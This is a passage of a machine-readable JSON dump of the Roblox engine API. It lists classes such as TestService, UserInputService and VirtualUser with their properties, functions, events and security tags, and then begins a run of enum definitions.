},{"Name":"spawnName","Type":"string"}],"Name":"ConfirmationCallback","tags":["RobloxScriptSecurity","noyield"],"Class":"TeleportService","type":"Callback"},{"ReturnType":"void","Arguments":[{"Name":"message","Type":"string"}],"Name":"ErrorCallback","tags":["RobloxScriptSecurity","noyield"],"Class":"TeleportService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"TerrainRegion","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["readonly"],"Class":"TerrainRegion"},{"ValueType":"Vector3","type":"Property","Name":"SizeInCells","tags":["readonly"],"Class":"TerrainRegion"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity"],"Class":"TerrainRegion","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TestService","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoRuns","tags":[],"Class":"TestService"},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"ErrorCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"Is30FpsThrottleEnabled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsPhysicsEnvironmentalThrottled","tags":[],"Class":"TestService"},{"ValueType":"bool","type":"Property","Name":"IsSleepAllowed","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"NumberOfPlayers","tags":[],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"SimulateSecondsLag","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"TestCount","tags":["readonly"],"Class":"TestService"},{"ValueType":"double","type":"Property","Name":"Timeout","tags":[],"Class":"TestService"},{"ValueType":"int","type":"Property","Name":"WarnCount","tags":["readonly"],"Class":"TestService"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Check","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Checkpoint","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Done","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Error","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Fail","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Message","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Require","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"condition","Default":null},{"Type":"string","Name":"description","Default":null},{"Type":"Instance","Name":"source","Default":"nil"},{"Type":"int","Name":"line","Default":"0"}],"Name":"Warn","tags":[],"Class":"TestService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"TestService","type":"YieldFunction"},{"Arguments":[{"Name":"condition","Type":"bool"},{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectConditionalResult","tags":[],"Class":"TestService","type":"Event"},{"Arguments":[{"Name":"text","Type":"string"},{"Name":"script","Type":"Instance"},{"Name":"line","Type":"int"}],"Name":"ServerCollectResult","tags":[],"Class":"TestService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"TextService","tags":["notCreatable"]},{"ReturnType":"Vector2","Arguments":[{"Type":"string","Name":"string","Default":null},{"Type":"int","Name":"fontSize","Default":null},{"Type":"Font","Name":"font","Default":null},{"Type":"Vector2","Name":"frameSize","Default":null}],"Name":"GetTextSize","tags":["RobloxScriptSecurity"],"Class":"TextService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TimerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Toolbar","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"text","Default":null},{"Type":"string","Name":"tooltip","Default":null},{"Type":"string","Name":"iconname","Default":null}],"Name":"CreateButton","tags":["PluginSecurity"],"Class":"Toolbar","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"TouchInputService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"TouchTransmitter","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"TweenService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"UserGameSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllTutorialsDisabled","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"CustomCameraMode","type":"Property","Name":"CameraMode","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"ComputerCameraMovementMode","type":"Property","Name":"ComputerCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ComputerMovementMode","type":"Property","Name":"ComputerMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"ControlMode","type":"Property","Name":"ControlMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"Fullscreen","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"UploadSetting","type":"Property","Name":"ImageUploadPromptBehavior","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MasterVolume","tags":[],"Class":"UserGameSettings"},{"ValueType":"float","type":"Property","Name":"MouseSensitivity","tags":[],"Class":"UserGameSettings"},{"ValueType":"RotationType","type":"Property","Name":"RotationType","tags":[],"Class":"UserGameSettings"},{"ValueType":"SavedQualitySetting","type":"Property","Name":"SavedQualityLevel","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchCameraMovementMode","type":"Property","Name":"TouchCameraMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"TouchMovementMode","type":"Property","Name":"TouchMovementMode","tags":[],"Class":"UserGameSettings"},{"ValueType":"bool","type":"Property","Name":"UsedHideHudShortcut","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"int","type":"Property","Name":"VRRotationIntensity","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ValueType":"UploadSetting","type":"Property","Name":"VideoUploadPromptBehavior","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"tutorialId","Default":null}],"Name":"GetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InFullScreen","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"InStudioMode","tags":[],"Class":"UserGameSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"tutorialId","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SetTutorialState","tags":["RobloxScriptSecurity"],"Class":"UserGameSettings","type":"Function"},{"Arguments":[{"Name":"isFullscreen","Type":"bool"}],"Name":"FullscreenChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Arguments":[{"Name":"isStudioMode","Type":"bool"}],"Name":"StudioModeChanged","tags":[],"Class":"UserGameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"UserInputService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AccelerometerEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GamepadEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"GyroscopeEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"KeyboardEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"ModalEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"MouseBehavior","type":"Property","Name":"MouseBehavior","tags":[],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"MouseIconEnabled","tags":[],"Class":"UserInputService"},{"ValueType":"OverrideMouseIconBehavior","type":"Property","Name":"OverrideMouseIconBehavior","tags":["RobloxScriptSecurity"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"TouchEnabled","tags":["readonly"],"Class":"UserInputService"},{"ValueType":"CoordinateFrame","type":"Property","Name":"UserHeadCFrame","tags":["deprecated","readonly"],"Class":"UserInputService"},{"ValueType":"bool","type":"Property","Name":"VREnabled","tags":["readonly"],"Class":"UserInputService"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null},{"Type":"KeyCode","Name":"gamepadKeyCode","Default":null}],"Name":"GamepadSupports","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetConnectedGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceAcceleration","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetDeviceGravity","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"GetDeviceRotation","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetFocusedTextBox","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadConnected","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetGamepadState","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetKeysPressed","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"UserInputType","Arguments":[],"Name":"GetLastInputType","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetNavigationGamepads","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"Platform","Arguments":[],"Name":"GetPlatform","tags":["RobloxScriptSecurity"],"Class":"UserInputService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"UserInputType","Name":"gamepadNum","Default":null}],"Name":"GetSupportedGamepadKeyCodes","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[{"Type":"UserCFrame","Name":"type","Default":null}],"Name":"GetUserCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"KeyCode","Name":"keyCode","Default":null}],"Name":"IsKeyDown","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null}],"Name":"IsNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RecenterUserHeadCFrame","tags":[],"Class":"UserInputService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"gamepadEnum","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetNavigationGamepad","tags":[],"Class":"UserInputService","type":"Function"},{"Arguments":[{"Name":"acceleration","Type":"Instance"}],"Name":"DeviceAccelerationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gravity","Type":"Instance"}],"Name":"DeviceGravityChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"rotation","Type":"Instance"},{"Name":"cframe","Type":"CoordinateFrame"}],"Name":"DeviceRotationChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadConnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"gamepadNum","Type":"UserInputType"}],"Name":"GamepadDisconnected","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputBegan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"InputEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"JumpRequest","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"lastInputType","Type":"UserInputType"}],"Name":"LastInputTypeChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxReleased","Type":"Instance"}],"Name":"TextBoxFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"textboxFocused","Type":"Instance"}],"Name":"TextBoxFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchEnded","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchLongPress","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchMoved","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPan","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchPinch","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchRotate","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touch","Type":"Instance"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchStarted","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchSwipe","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"gameProcessedEvent","Type":"bool"}],"Name":"TouchTap","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[{"Name":"type","Type":"UserCFrame"},{"Name":"value","Type":"CoordinateFrame"}],"Name":"UserCFrameChanged","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocusReleased","tags":[],"Class":"UserInputService","type":"Event"},{"Arguments":[],"Name":"WindowFocused","tags":[],"Class":"UserInputService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Vector3Value","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Value","tags":[],"Class":"Vector3Value"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"Changed","tags":[],"Class":"Vector3Value","type":"Event"},{"Arguments":[{"Name":"value","Type":"Vector3"}],"Name":"changed","tags":["deprecated"],"Class":"Vector3Value","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"VirtualUser","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button1Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Down","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"Button2Up","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CaptureController","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton1","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"ClickButton2","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"position","Default":null},{"Type":"CoordinateFrame","Name":"camera","Default":"Identity"}],"Name":"MoveMouse","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyDown","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"SetKeyUp","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StartRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"StopRecording","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"TypeKey","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Visit","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[],"Name":"GetUploadUrl","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"pingUrl","Default":null},{"Type":"int","Name":"interval","Default":null}],"Name":"SetPing","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetUploadUrl","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"type":"Enum","Name":"AASamples","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":1,"Enum":"AASamples"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"AASamples"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"AASamples"},{"type":"Enum","Name":"AccessType","tags":[]},{"type":"EnumItem","Name":"Me","tags":[],"Value":0,"Enum":"AccessType"},{"type":"EnumItem","Name":"Friends","tags":[],"Value":1,"Enum":"AccessType"},{"type":"EnumItem","Name":"Everyone","tags":[],"Value":2,"Enum":"AccessType"},{"type":"EnumItem","Name":"InviteOnly","tags":[],"Value":3,"Enum":"AccessType"},{"type":"Enum","Name":"ActionType","tags":[]},{"type":"EnumItem","Name":"Nothing","tags":[],"Value":0,"Enum":"ActionType"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":1,"Enum":"ActionType"},{"type":"EnumItem","Name":"Lose","tags":[],"Value":2,"Enum":"ActionType"},{"type":"EnumItem","Name":"Draw","tags":[],"Value":3,"Enum":"ActionType"},{"type":"EnumItem","Name":"Win","tags":[],"Value":4,"Enum":"ActionType"},{"type":"Enum","Name":"ActuatorType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":1,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Servo","tags":[],"Value":2,"Enum":"ActuatorType"},{"type":"Enum","Name":"AnimationPriority","tags":[]},{"type":"EnumItem","Name":"Idle","tags":[],"Value":0,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Action","tags":[],"Value":2,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Core","tags":[],"Value":1000,"Enum":"AnimationPriority"},{"type":"Enum","Name":"Antialiasing","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"Antialiasing"},{"type":"Enum","Name":"Axis","tags":[]},{"type":"EnumItem","Name":"X","tags":[],"Value":0,"Enum":"Axis"},{"type":"EnumItem","Name":"Y","tags":[],"Value":1,"Enum":"Axis"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"Axis"},{"type":"Enum","Name":"BinType","tags":[]},{"type":"EnumItem","Name":"Script","tags":[],"Value":0,"Enum":"BinType"},{"type":"EnumItem","Name":"GameTool","tags":[],"Value":1,"Enum":"BinType"},{"type":"EnumItem","Name":"Grab","tags":[],"Value":2,"Enum":"BinType"},{"type":"EnumItem","Name":"Clone","tags":[],"Value":3,"Enum":"BinType"},{"type":"EnumItem","Name":"Hammer","tags":[],"Value":4,"Enum":"BinType"},{"type":"Enum","Name":"BodyPart","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"BodyPart"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftArm","tags":[],"Value":2,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightArm","tags":[],"Value":3,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftLeg","tags":[],"Value":4,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightLeg","tags":[],"Value":5,"Enum":"BodyPart"},{"type":"Enum","Name":"Button","tags":[]},{"type":"EnumItem","Name":"Jump","tags":[],"Value":32,"Enum":"Button"},{"type":"EnumItem","Name":"Dismount","tags":[],"Value":8,"Enum":"Button"},{"type":"Enum","Name":"ButtonStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButtonDefault","tags":[],"Value":1,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButton","tags":[],"Value":2,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundButton","tags":[],"Value":3,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDefaultButton","tags":[],"Value":4,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDropdownButton","tags":[],"Value":5,"Enum":"ButtonStyle"},{"type":"Enum","Name":"CameraMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraMode"},{"type":"EnumItem","Name":"LockFirstPerson","tags":[],"Value":1,"Enum":"CameraMode"},{"type":"Enum","Name":"CameraPanMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraPanMode"},{"type":"EnumItem","Name":"EdgeBump","tags":[],"Value":1,"Enum":"CameraPanMode"},{"type":"Enum","Name":"CameraType","tags":[]},{"type":"EnumItem","Name":"Fixed","tags":[],"Value":0,"Enum":"CameraType"},{"type":"EnumItem","Name":"Watch","tags":[],"Value":2,"Enum":"CameraType"},{"type":"EnumItem","Name":"Attach","tags":[],"Value":1,"Enum":"CameraType"},{"type":"EnumItem","Name":"Track","tags":[],"Value":3,"Enum":"CameraType"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":4,"Enum":"CameraType"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":5,"Enum":"CameraType"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":6,"Enum":"CameraType"},{"type":"Enum","Name":"CellBlock","tags":[]},{"type":"EnumItem","Name":"Solid","tags":[],"Value":0,"Enum":"CellBlock"},{"type":"EnumItem","Name":"VerticalWedge","tags":[],"Value":1,"Enum":"CellBlock"},{"type":"EnumItem","Name":"CornerWedge","tags":[],"Value":2,"Enum":"CellBlock"},{"type":"EnumItem","Name":"InverseCornerWedge","tags":[],"Value":3,"Enum":"CellBlock"},{"type":"EnumItem","Name":"HorizontalWedge","tags":[],"Value":4,"Enum":"CellBlock"},{"type":"Enum","Name":"CellMaterial","tags":[]},{"type":"EnumItem","Name":"Empty","tags":[],"Value":0,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":2,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":3,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":4,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Asphalt","tags":[],"Value":5,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Iron","tags":[],"Value":6,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Aluminum","tags":[],"Value":7,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gold","tags":[],"Value":8,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodPlank","tags":[],"Value":9,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodLog","tags":[],"Value":10,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gravel","tags":[],"Value":11,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"CinderBlock","tags":[],"Value":12,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"MossyStone","tags":[],"Value":13,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Cement","tags":[],"Value":14,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"RedPlastic","tags":[],"Value":15,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"BluePlastic","tags":[],"Value":16,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Water","tags":[],"Value":17,"Enum":"CellMaterial"},{"type":"Enum","Name":"CellOrientation","tags":[]},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":0,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"NegX","tags":[],"Value":3,"Enum":"CellOrientation"},{"type":"Enum","Name":"CenterDialogType","tags":[]},{"type":"EnumItem","Name":"UnsolicitedDialog","tags":[],"Value":1,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"PlayerInitiatedDialog","tags":[],"Value":2,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"ModalDialog","tags":[],"Value":3,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"QuitDialog","tags":[],"Value":4,"Enum":"CenterDialogType"},{"type":"Enum","Name":"ChatColor","tags":[]},{"type":"EnumItem","Name":"Blue","tags":[],"Value":0,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Green","tags":[],"Value":1,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Red","tags":[],"Value":2,"Enum":"ChatColor"},{"type":"Enum","Name":"ChatMode","tags":[]},{"type":"EnumItem","Name":"Menu","tags":[],"Value":0,"Enum":"ChatMode"},{"type":"EnumItem","Name":"TextAndMenu","tags":[],"Value":1,"Enum":"ChatMode"},{"type":"Enum","Name":"ChatStyle","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"Bubble","tags":[],"Value":1,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"ClassicAndBubble","tags":[],"Value":2,"Enum":"ChatStyle"},{"type":"Enum","Name":"CollisionFidelity","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Hull","tags":[],"Value":1,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Box","tags":[],"Value":2,"Enum":"CollisionFidelity"},{"type":"Enum","Name":"ComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"ComputerCameraMovementMode"},{"type":"Enum","Name":"ComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"ComputerMovementMode"},{"t